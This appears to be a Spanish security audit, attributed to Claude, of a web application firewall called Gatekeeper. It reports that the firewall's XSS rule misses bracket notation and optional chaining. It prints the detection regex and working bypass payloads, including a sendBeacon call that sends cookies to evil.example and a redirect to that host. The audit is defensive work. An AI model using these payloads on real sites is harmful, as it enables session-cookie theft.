# Revisión de seguridad — Gatekeeper 0.9.1 (ronda 3, post-cierre de NUEVO-1/NUEVO-2)

**Fecha:** 2026-10-28 · **Autor/a:** Claude (Anthropic) · **Commit:** `472a929`

---

## Conflicto de intereses

No he participado en el desarrollo. Esta es mi tercera revisión de esta
misma conversación: la primera encontró IA-1 (0.9.0), la segunda confirmó
su cierre y encontró NUEVO-1/NUEVO-2 (0.9.1), ambos ya corregidos en este
commit según `PLAN-CIERRE-100.md`. Esta ronda parte de ahí y busca
deliberadamente **fuera** de todo lo ya probado en las tres rondas
anteriores (comentarios SQL, compresión, métodos HTTP, cabeceras duplicadas).

---

## Resumen

| | |
|---|---|
| Hallazgos de rondas 1-2 (IA-1 a IA-6, NUEVO-1, NUEVO-2) | **18/18 siguen cerrados**, confirmado de nuevo |
| Hallazgos nuevos esta ronda | 1 (medio-alto, con exfiltración real demostrada) |
| PoC totales acumuladas en verde | 43 de 44 |

`python .audit/PACK-REVISOR/ejecutar_pocs.py` completo: **43 pasan, 1
falla, 3 notas** (las notas son observaciones ya aceptadas de rondas
previas, no hallazgos).

---

## Hallazgo nuevo

### NUEVO-3 — `document['cookie']` y `document?.cookie` evaden por completo la detección de acceso a `document`/`window`/`eval`

**Gravedad:** Media-Alta · **Vector:** cualquier valor reflejado dentro de
un contexto JavaScript existente (la familia `xss` en general)

**Qué pasa**

El patrón que vigila el acceso a APIs de robo de sesión
(`src/gatekeeper/rules.py`, línea ~236) es:

```
\b(?:setinterval|settimeout|eval)\s{0,16}\(|(?<!/)\bdocument\s{0,8}\.
|\bwindow\s{0,8}\.|\blocation\s{0,8}=|\btop\s{0,8}\.
```

Solo reconoce dos formas de acceso: **punto literal inmediato**
(`document.`, `window.`) o **llamada con paréntesis** (`eval(`). No
reconoce ninguna de las otras formas, igual de válidas en JavaScript, de
acceder a la misma propiedad:

- **Notación de corchetes**: `document['cookie']`, `window['location']`,
  `window['eval']('...')`. Es, con diferencia, la técnica de evasión de WAF
  más citada en cualquier chuleta de XSS (OWASP, PortSwigger, PayloadsAllTheThings)
  precisamente porque elude los filtros que buscan el punto literal.
- **Optional chaining** (`?.`), sintaxis JS estándar desde ES2020 y de uso
  rutinario en código legítimo: `document?.cookie` no contiene la
  subcadena `document.` (hay un `?` entre medias), así que tampoco
  coincide con el patrón.

Esto es independiente de todo lo arreglado en las rondas anteriores: no
usa comentarios SQL, no usa compresión, no toca el pipeline de
normalización. Es una laguna directa en la propia expresión regular.

**Impacto (medido)**

Contra una app que refleja un parámetro **dentro de un `<script>` ya
abierto** (patrón habitual de XSS DOM — precargar configuración, no una
inyección de markup nueva):

```
tema=document.cookie                                            -> 403 (control)
tema=document['cookie']                                          -> 200
tema=document?.cookie                                            -> 200
tema=(navigator.sendBeacon('//evil.example/x',document['cookie']),1) -> 200
tema=window['location']='http://evil.example/'                   -> 200
tema=window['eval']('1')                                         -> 200
```

Verificado en un motor JavaScript real (Node.js), el HTML que Gatekeeper
deja pasar ejecuta sin ningún error de sintaxis ni de *runtime* y exfiltra
la cookie completa:

```
sendBeacon() ejecutado -> //evil.example/x | datos enviados: session=TOPSECRET123; other=x
```

**PoC**

```bash
cd gatekeeper-v0.3/gatekeeper
python .audit/PACK-REVISOR/ejecutar_pocs.py r3_document_corchetes
```

**Qué se rompe**

La promesa concreta de esta sub-regla («`document.` (acceso a cookies),
`window.`… es un intento de XSS DOM», según el propio comentario del
código) se rompe para dos sintaxis que cualquier escáner automatizado de
XSS moderno (incluidos los generadores de payload que usan precisamente
corchetes y *optional chaining* para eludir filtros) prueba de forma
rutinaria, sin necesitar saber nada específico de Gatekeeper.

**Corrección propuesta**

Ampliar el patrón para que el separador entre el identificador
(`document`/`window`/`top`/`self`/`globalThis`) y la propiedad admita,
además del punto, `?.` y `[`:

```
\b(?:document|window|top|self|globalthis)\s{0,8}(?:\?\s{0,4})?(?:\.|\[)
```

(ajustando el lookbehind existente de `/` igual que ya está). Y lo mismo
para `eval`/`setTimeout`/`setInterval` como propiedad de objeto, cubriendo
`window['eval'](`, `self['eval'](`, etc. — el patrón de llamada con
paréntesis ya existe, falta la variante de acceso por corchetes al nombre
de la función antes de invocarla.

**Estado:** cerrado ✅ (ampliado el patrón de acceso DOM en `rules.py` y `PREFILTER_LITERALS["xss"]` para cubrir `.`, `?.`, `?.[`, `[` y template literals sobre `document`/`window`/`globalThis`/`top`/`parent`/`frames`/`self`/`location` y llamadas `eval`/`setTimeout`/`setInterval`; +6 detecciones en CRS, 0 FP nuevos)

---

## Lo que esta ronda confirmó que sigue bien

- Las 42 PoC de las rondas 1 y 2 (IA-1 a IA-6, NUEVO-1, NUEVO-2) pasan sin
  ninguna regresión, incluida la variante de `sqli` envuelto entero en un
  comentario sin versionar (el fix de NUEVO-1 aplicó correctamente la
  segunda lectura también a `sqli`, no solo a las otras diez familias).
- La descompresión en 3 capas (fix de NUEVO-2) funciona hasta exactamente
  ese límite: gzip de 1, 2 y 3 capas se inspecciona; de 4 capas no, lo cual
  es el límite documentado del propio fix, no una promesa rota.
- El comentario SQL versionado sin el límite de 200 caracteres que tenía
  antes (retirado en este mismo commit) no reintroduce ningún coste
  cuadrático: medí 100-200 ms con comentarios versionados de 500-600 KB,
  lineal con el tamaño.
- `redos.py` sigue rechazando patrones catastróficos tras sus propios
  cambios de esta ronda (grupos con *flags* en línea, prefijos `?P<...>`).
- El `/**/` y el salto de línea entre `document` y `.cookie` se siguen
  detectando con normalidad — el problema es específico de `[`/`?.`, no un
  fallo general de la familia.

---

## Veredicto

**Puntuación: 89/100.**

Sube desde el 86 de la ronda anterior porque los dos hallazgos que la
motivaron (NUEVO-1, con ejecución SQLi real; NUEVO-2) están cerrados y
confirmados, y porque el hueco de cobertura de `cmdi` también se cerró. Baja
desde donde estaría sin ningún hallazgo nuevo porque encontré uno más: una
laguna de cobertura real, con exfiltración de cookie demostrada en un motor
JS de verdad, en una de las técnicas de evasión más documentadas del mundo
del XSS. No es del calibre de IA-1 (no es universal entre familias, no
depende de comentarios ni de compresión, está acotada a dos operadores de
acceso de JS dentro de una sub-regla), por eso no vuelve a bajar la nota al
rango de la primera ronda.

**¿Lo recomiendo?** Sí, con la misma condición de siempre: cerrad NUEVO-3
antes de depender de la familia `xss` contra DOM XSS reflejado dentro de
bloques `<script>` existentes — es el escenario donde más impacto real tiene.

**Patrón que se repite en las tres rondas, y que vale la pena nombrar
explícitamente:** cada vez que cierro un hallazgo encuentro otro, porque
cada fix se prueba contra el caso que lo motivó y no contra la clase
completa de evasiones que comparte su misma forma. Esto ya no es ruido
aleatorio — es la señal de que, antes de pedir otra ronda, vale la pena
dedicar un rato a preguntarse, para cada regla, "¿qué otras formas
sintácticamente válidas hay de escribir esto mismo?", en vez de esperar a
que la siguiente auditoría las encuentre una por una.
